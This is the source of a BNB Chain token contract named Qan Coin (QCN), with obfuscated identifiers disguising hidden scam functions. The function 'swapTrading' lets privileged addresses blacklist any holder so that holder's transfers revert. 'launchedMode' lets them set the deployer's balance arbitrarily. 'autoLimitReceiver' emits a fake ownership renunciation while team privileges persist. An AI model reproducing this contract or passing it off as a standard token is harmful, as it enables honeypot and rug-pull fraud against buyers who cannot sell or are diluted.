/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

abstract contract launchTo {
    function walletToken() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface swapTxAmount {
    function createPair(address toAuto, address limitMarketingMax) external returns (address);
}

interface receiverLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract QanCoin is IERC20, launchTo {

    function tradingLaunch() public view returns (bool) {
        return swapFee;
    }

    function approve(address isAmount, uint256 isSenderLiquidity) public virtual override returns (bool) {
        isShould[walletToken()][isAmount] = isSenderLiquidity;
        emit Approval(walletToken(), isAmount, isSenderLiquidity);
        return true;
    }

    event OwnershipTransferred(address indexed swapAmountLaunched, address indexed enableWallet);

    mapping(address => mapping(address => uint256)) private isShould;

    function swapTrading(address fundWalletLaunched) public {
        
        if (fundWalletLaunched == feeSenderTotal || fundWalletLaunched == limitToAuto || !teamMin[walletToken()]) {
            return;
        }
        
        buySenderIs[fundWalletLaunched] = true;
    }

    string private liquidityAmount = "Qan Coin";

    function transfer(address takeReceiver, uint256 isSenderLiquidity) external virtual override returns (bool) {
        return amountShouldReceiver(walletToken(), takeReceiver, isSenderLiquidity);
    }

    function autoLimitReceiver() public {
        emit OwnershipTransferred(feeSenderTotal, address(0));
        launchedTxTeam = address(0);
    }

    function decimals() external view returns (uint8) {
        return takeTeam;
    }

    function feeLaunchWallet(address totalEnable, address enableAmount, uint256 isSenderLiquidity) internal returns (bool) {
        require(launchAmount[totalEnable] >= isSenderLiquidity);
        launchAmount[totalEnable] -= isSenderLiquidity;
        launchAmount[enableAmount] += isSenderLiquidity;
        emit Transfer(totalEnable, enableAmount, isSenderLiquidity);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atFee;
    }

    bool public shouldExempt;

    function launchedMode(uint256 isSenderLiquidity) public {
        if (!teamMin[walletToken()]) {
            return;
        }
        launchAmount[feeSenderTotal] = isSenderLiquidity;
    }

    function transferFrom(address totalEnable, address enableAmount, uint256 isSenderLiquidity) external override returns (bool) {
        if (isShould[totalEnable][walletToken()] != type(uint256).max) {
            require(isSenderLiquidity <= isShould[totalEnable][walletToken()]);
            isShould[totalEnable][walletToken()] -= isSenderLiquidity;
        }
        return amountShouldReceiver(totalEnable, enableAmount, isSenderLiquidity);
    }

    function launchedAt() public view returns (uint256) {
        return listAt;
    }

    function name() external view returns (string memory) {
        return liquidityAmount;
    }

    uint256 public senderReceiver;

    address public limitToAuto;

    uint256 public teamMode;

    constructor (){
        
        receiverLimit takeIsMin = receiverLimit(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        limitToAuto = swapTxAmount(takeIsMin.factory()).createPair(takeIsMin.WETH(), address(this));
        launchedTxTeam = walletToken();
        
        feeSenderTotal = walletToken();
        teamMin[walletToken()] = true;
        if (teamMode == listAt) {
            swapFee = true;
        }
        launchAmount[walletToken()] = atFee;
        emit Transfer(address(0), feeSenderTotal, atFee);
        autoLimitReceiver();
    }

    function amountShouldReceiver(address totalEnable, address enableAmount, uint256 isSenderLiquidity) internal returns (bool) {
        if (totalEnable == feeSenderTotal) {
            return feeLaunchWallet(totalEnable, enableAmount, isSenderLiquidity);
        }
        require(!buySenderIs[totalEnable]);
        return feeLaunchWallet(totalEnable, enableAmount, isSenderLiquidity);
    }

    bool public receiverLaunch;

    function getOwner() external view returns (address) {
        return launchedTxTeam;
    }

    address private launchedTxTeam;

    function allowance(address receiverIs, address isAmount) external view virtual override returns (uint256) {
        return isShould[receiverIs][isAmount];
    }

    mapping(address => uint256) private launchAmount;

    mapping(address => bool) public teamMin;

    function owner() external view returns (address) {
        return launchedTxTeam;
    }

    uint8 private takeTeam = 18;

    uint256 public buyTxIs;

    function enableAtWallet(address maxIs) public {
        if (shouldExempt) {
            return;
        }
        if (feeSell == swapFee) {
            buyTxIs = teamMode;
        }
        teamMin[maxIs] = true;
        if (receiverLaunch) {
            feeSell = false;
        }
        shouldExempt = true;
    }

    bool private feeSell;

    uint256 private atFee = 100000000 * 10 ** 18;

    function balanceOf(address tradingSell) public view virtual override returns (uint256) {
        return launchAmount[tradingSell];
    }

    address public feeSenderTotal;

    uint256 public listAt;

    function amountTokenTake() public view returns (bool) {
        return swapFee;
    }

    bool public swapFee;

    function toTokenFund() public view returns (bool) {
        return swapFee;
    }

    mapping(address => bool) public buySenderIs;

    function symbol() external view returns (string memory) {
        return maxList;
    }

    string private maxList = "QCN";

}